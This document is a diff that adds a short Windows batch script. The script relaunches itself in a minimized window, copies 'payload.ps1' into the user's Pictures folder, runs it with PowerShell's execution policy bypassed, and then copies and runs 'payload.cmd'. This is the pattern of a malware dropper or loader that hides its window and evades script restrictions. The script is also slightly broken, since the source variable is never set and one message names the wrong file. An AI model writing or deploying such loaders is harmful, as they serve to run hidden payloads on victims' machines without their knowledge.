@@ -1,0 +1,23 @@
+@echo off
+
+if "%1" == "" start "" /min "%~f0" MY_FLAG && exit
+
+
+set destination=%USERPROFILE%\Pictures
+
+echo Copying payload.ps1 from %source% to %destination%...
+copy /Y "%source%\payload.ps1" "%destination%"
+
+echo Running payload.ps1 with Bypass policy...
+powershell -ExecutionPolicy Bypass -File "%destination%\payload.ps1"
+
+echo Waiting for PowerShell script to finish...
+timeout /t 5 /nobreak >nul
+
+echo Copying payload.bat from %source% to %destination%...
+copy /Y "%source%\payload.cmd" "%destination%"
+
+echo Running payload.cmd...
+"%destination%\payload.cmd"
+
+echo Script execution complete.
